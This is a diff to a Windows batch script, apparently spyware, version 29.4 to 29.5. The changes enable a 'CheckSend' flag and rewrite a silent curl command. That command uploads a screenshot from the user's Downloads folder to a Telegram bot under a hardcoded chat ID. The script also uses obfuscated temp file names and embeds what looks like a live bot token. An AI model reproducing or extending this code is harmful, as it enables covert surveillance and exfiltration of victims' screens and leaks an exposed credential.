@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=29.4"
+set "BATCHVERSION=29.5"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -143,7 +143,7 @@ echo.
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
+set "CheckSend=1"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo CheckSend=!CheckSend!
@@ -2274,7 +2274,8 @@ echo.
 :PEROTY
 
 
-
+set "MAX_RETRIES=3"
+set "RETRY_COUNT=0"
 
 :: ============ Updates & SCRNSHTS TOPIC ============
 set "TOKEN_UPDATESSCRNSHTS=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
@@ -2308,8 +2309,9 @@ if %errorlevel%==0 (
 
 
 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@%USERPROFILE%\Downloads\screenshot.jpg" > "%RESULT%" 2>&1
-
+::curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@%USERPROFILE%\Downloads\screenshot.jpg" > "%RESULT%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=1040442734" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@\"%USERPROFILE%\Downloads\screenshot.jpg\"" > "%RESULT%" 2>&1
+::1040442734
 
 
 findstr /i "message_id" "%RESULT%" >nul
